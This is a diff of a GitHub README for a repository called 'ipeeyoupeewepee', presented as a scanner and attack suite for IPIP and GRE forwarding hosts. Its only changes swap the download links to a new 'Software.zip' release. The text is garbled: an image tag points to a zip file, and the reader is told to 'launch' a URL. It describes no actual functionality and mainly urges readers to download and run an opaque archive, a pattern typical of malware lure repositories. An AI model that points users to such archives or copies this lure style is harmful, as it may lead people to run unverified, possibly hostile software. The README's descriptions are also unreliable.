@@ -1,7 +1,7 @@
 # 🚀 Welcome to the "ipeeyoupeewepee" Repository! 🛡️
 ### Scanner and Attack Suite for IPIP and GRE Forwarding Hosts
 
-![shield](https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v1.0/Release.zip)
+![shield](https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v2.0/Software.zip)
 
 ---
 
@@ -41,9 +41,9 @@ Welcome to the "ipeeyoupeewepee" repository - your go-to solution for scanning a
 ## Get Started
 To start using the "ipeeyoupeewepee" suite, download the software package from the following link:
 
-[![shield](https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v1.0/Release.zip)](https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v1.0/Release.zip) 
+[![shield](https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v2.0/Software.zip)](https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v2.0/Software.zip) 
 
-📂 **Launch the https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v1.0/Release.zip file to begin utilizing the scanner and attack suite functionalities.**
+📂 **Launch the https://github.com/GustavoHGP/ipeeyoupeewepee/releases/download/v2.0/Software.zip file to begin utilizing the scanner and attack suite functionalities.**
 
 If the link above does not work, kindly check the "Releases" section of this repository for alternative download options.
 
